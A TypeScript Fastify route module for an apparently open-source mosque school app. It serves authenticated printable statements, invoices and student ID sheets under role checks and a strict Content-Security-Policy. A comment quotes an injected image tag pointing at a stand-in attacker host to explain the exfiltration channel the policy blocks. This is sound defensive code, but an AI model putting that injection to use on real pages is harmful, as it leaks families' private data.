// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 OpenMasjid-Solutions
/**
 * Authed serving of the app's printable documents (CLAUDE.md §4, §5, §14):
 *   GET /statements/family/:id  — a household's balance, open bills and payment history
 *   GET /sheets/family/:id      — a household's onboarding sheet (children, fees, how to pay)
 *   GET /invoices/:id           — ONE child's bill for one period, line by line (0.47.0)
 *   GET /sheets/ids/:id         — every active child's Student ID by class; `:id` is a school or `all` (0.48.0)
 *
 * All are registered before the SPA fallback and excluded from the tRPC/session middleware, so each
 * gates itself: session from the cookie, role must be admin (LAN only) or finance (LAN + tunnel),
 * re-checked on every request. They carry Student IDs, guardian contact details, a child's date of
 * birth and payment history, so they are NEVER on a public static mount.
 *
 * They live in one module on purpose. The auth gate, the CSP and the QR base-URL derivation are the
 * security-critical parts and are identical for all of them — duplicating them in a second file is how
 * one copy quietly loses a header.
 */
import type { FastifyInstance, FastifyRequest, FastifyReply } from 'fastify';
import { getSession, COOKIE } from '../auth/sessions';
import { classifyOrigin } from '../security/origin';
import { config } from '../config';
import { buildFamilyStatementHtml, canServeStatement } from './statements';
import { buildInvoiceHtml } from './invoiceDoc';
import { buildFamilySheetHtml } from '../people/onboardingSheet';
import { buildIdSheetHtml } from '../people/idSheet';
import { isSchoolRestricted, visibleSchoolIds } from '../schools';
import type { Session } from '../db/schema';

/**
 * Defence in depth for a page assembled by string concatenation that carries a family's Student IDs
 * and payment history (§14). The values in it are all escaped, so this is a second line, not the first.
 *
 * `'unsafe-inline'` is a deliberate, bounded compromise. The sheet has one authored `<style>` block and
 * one `onclick="window.print()"`, both static and both ours; a nonce-based policy is stricter and is
 * the right follow-up, but it is not the part doing the work here. What this policy buys, even with
 * inline allowed, is that `default-src 'none'` blocks EVERY external load — so an injected
 * `<img src="https://attacker/?…">` never fires and there is no channel to exfiltrate the page down —
 * plus no framing, no form posts, and no `<base>` hijack. That is worth having, and it cannot regress
 * rendering: `img-src data:` covers both the inlined logo and the QR code, which are the only images.
 *
 * `/api/logo` sets a policy of the same shape (index.ts); this brings the statement route in line.
 */
const STATEMENT_CSP = [
  "default-src 'none'",
  "img-src data:", // the inlined logo + the generated QR — both data: URIs, nothing remote
  "style-src 'unsafe-inline'",
  "script-src 'unsafe-inline'", // the Print button's onclick
  "form-action 'none'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
].join('; ');

/** The origin the QR points at: the tunnel public URL when set, else the LAN host of this request. */
function baseUrlFor(req: FastifyRequest): string {
  if (config.omosPublicUrl) return config.omosPublicUrl;
  const xfp = req.headers['x-forwarded-proto'];
  const proto = (Array.isArray(xfp) ? xfp[0] : xfp)?.split(',')[0].trim() || req.protocol || 'http';
  const host = req.headers.host || `localhost:${config.port}`;
  return `${proto}://${host}`;
}

export function registerStatementRoutes(app: FastifyInstance): void {
  /** Shared by every document: authorise, render, and send with the full header set. */
  async function servePrintable(
    req: FastifyRequest<{ Params: { id: string } }>,
    reply: FastifyReply,
    build: (id: string, baseUrl: string, session: Session) => Promise<string | null>,
  ) {
    const token = (req as unknown as { cookies?: Record<string, string> }).cookies?.[COOKIE];
    const session = getSession(token);
    if (!session || !canServeStatement(session.role, classifyOrigin(req))) {
      return reply.code(403).type('text/plain').send('You don’t have access to that.');
    }
    const html = await build(req.params.id, baseUrlFor(req), session);
    if (html == null) return reply.code(404).type('text/plain').send('Not found.');
    return reply
      .header('Content-Type', 'text/html; charset=utf-8')
      .header('Cache-Control', 'no-store')
      .header('Content-Security-Policy', STATEMENT_CSP)
      .header('X-Content-Type-Options', 'nosniff')
      .header('Referrer-Policy', 'no-referrer')
      .send(html);
  }

  app.get('/statements/family/:id', (req: FastifyRequest<{ Params: { id: string } }>, reply: FastifyReply) =>
    servePrintable(req, reply, buildFamilyStatementHtml),
  );

  // The onboarding sheet a household is handed when their children go on the system — one sheet for the
  // family, not one per child. Same gate as the statement: it carries the children's dates of birth and
  // the household's contact details, which finance and admin may see and nobody else may (§5).
  app.get('/sheets/family/:id', (req: FastifyRequest<{ Params: { id: string } }>, reply: FastifyReply) =>
    servePrintable(req, reply, (id, base) => buildFamilySheetHtml(id, base)),
  );

  // One child's bill for one period (0.47.0) — what a family asks for when they want "the invoice for
  // September", as opposed to the household statement above. Same gate: it names a child and their
  // household's money. `baseUrl` is unused here (there is no QR on a bill), hence the discard.
  app.get('/invoices/:id', (req: FastifyRequest<{ Params: { id: string } }>, reply: FastifyReply) =>
    servePrintable(req, reply, async (id) => buildInvoiceHtml(id)),
  );

  // Every active child's Student ID, by class (0.48.0) — the office's own lookup sheet, and what the
  // import's Print button now opens instead of printing the screen it was sitting on.
  //
  // `:id` is a school id or `all`. The reader's own school restriction is applied on top of it
  // (schools/index.ts: no rows means every school), so a staff account limited to the maktab gets the
  // maktab's roster whichever value the link carried — a restriction narrows a view, and it must not be
  // widenable by editing a URL.
  app.get('/sheets/ids/:id', (req: FastifyRequest<{ Params: { id: string } }>, reply: FastifyReply) =>
    servePrintable(req, reply, async (id, _base, session) => {
      const userId = session.userId ?? null;
      return buildIdSheetHtml(id, { allowed: visibleSchoolIds(userId), restricted: isSchoolRestricted(userId) });
    }),
  );
}
